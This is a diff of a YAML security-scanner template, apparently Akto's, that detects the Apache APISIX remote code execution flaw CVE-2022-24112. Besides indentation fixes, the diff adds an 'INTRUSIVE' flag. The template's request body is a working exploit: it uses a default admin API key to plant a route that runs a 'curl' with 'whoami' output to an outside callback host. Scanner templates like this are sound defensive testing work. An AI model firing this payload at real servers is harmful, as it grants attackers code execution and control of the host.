@@ -2,7 +2,7 @@ id: APACHE_APISIX_RCE
 info:
   name: Apache APISIX Remote Code Execution
   description: "This vulnerability allows attackers to execute arbitrary code on a server running Apache APISIX. This issue is due to inadequate input validation or insecure deserialization within the application. By exploiting this flaw, attackers can gain control of the affected server, leading to potential unauthorized access, data breaches, or complete system compromise. Immediate patching is necessary to mitigate this critical security risk."
-  details:  "This vulnerability arises from insufficient validation of user inputs or unsafe deserialization processes within the Apache APISIX API gateway. Attackers can exploit this flaw by sending specially crafted requests that manipulate the application’s handling of inputs. This exploitation can lead to arbitrary code execution on the server, potentially allowing attackers to gain full control over the system, access sensitive data, or disrupt services. Updating to the latest versions is essential to address this issue."
+  details: "This vulnerability arises from insufficient validation of user inputs or unsafe deserialization processes within the Apache APISIX API gateway. Attackers can exploit this flaw by sending specially crafted requests that manipulate the application’s handling of inputs. This exploitation can lead to arbitrary code execution on the server, potentially allowing attackers to gain full control over the system, access sensitive data, or disrupt services. Updating to the latest versions is essential to address this issue."
   impact: "The impact of this vulnerability is severe, as it enables attackers to execute arbitrary code on the affected server. This could lead to full system compromise, unauthorized access to sensitive data, and potential disruption of services. The vulnerability poses a high risk to the security and stability of the API gateway and the broader infrastructure it supports. Prompt remediation is critical to prevent exploitation and ensure system integrity."
   category:
     name: COMMAND_INJECTION
@@ -16,6 +16,8 @@ info:
     - CWE-77
   cve:
     - CVE-2022-24112
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -38,42 +40,42 @@ execute:
   type: multiple
   requests:
     - req:
-      - modify_method: POST
-      - modify_url: "/apisix/batch-requests"
-      - add_header:
-          Accept-Language: "zh-CN,zh;q=0.9"
-      - add_header: 
-          Accept-Encoding: "gzip, deflate"
-      - send_ssrf_req:
-          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - replace_body: '{"headers":{"X-Real-IP":"127.0.0.1","Content-Type":"application/json"},"timeout":1500,"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1","body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/abcdefgh\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute("curl https://test-services.akto.io/${random_uuid}/`whoami`"); return true end\"}"}]}'
-      - validate:
-          response_code:
-            gte: 505
-      - success: x2
-      - failure: exit
+        - modify_method: POST
+        - modify_url: "/apisix/batch-requests"
+        - add_header:
+            Accept-Language: "zh-CN,zh;q=0.9"
+        - add_header:
+            Accept-Encoding: "gzip, deflate"
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        - replace_body: '{"headers":{"X-Real-IP":"127.0.0.1","Content-Type":"application/json"},"timeout":1500,"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1","body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/abcdefgh\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute("curl https://test-services.akto.io/${random_uuid}/`whoami`"); return true end\"}"}]}'
+        - validate:
+            response_code:
+              gte: 505
+        - success: x2
+        - failure: exit
     - req:
-      - modify_method: GET
-      - add_header:
-          Accept-Language: "zh-CN,zh;q=0.9"
-      - add_header: 
-          Accept-Encoding: "gzip, deflate"
-      - send_ssrf_req:
-          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - modify_url: "/api/abcdefgh"
-      - replace_body: '{}'
-      - validate:
-          response_code:
-            eq: 200
-          ssrf_url_hit: ${random_uuid}
-          response_payload:
-            length:
-              gt: 0
-            contains_all:
-              - "\"reason\":\"OK\""
-              - "\"status\":200"
-            not_contains:
-              - <html>
-              - </html>
-      - success: vulnerable
-      - failure: exit  
+        - modify_method: GET
+        - add_header:
+            Accept-Language: "zh-CN,zh;q=0.9"
+        - add_header:
+            Accept-Encoding: "gzip, deflate"
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        - modify_url: "/api/abcdefgh"
+        - replace_body: '{}'
+        - validate:
+            response_code:
+              eq: 200
+            ssrf_url_hit: ${random_uuid}
+            response_payload:
+              length:
+                gt: 0
+              contains_all:
+                - "\"reason\":\"OK\""
+                - "\"status\":200"
+              not_contains:
+                - <html>
+                - </html>
+        - success: vulnerable
+        - failure: exit
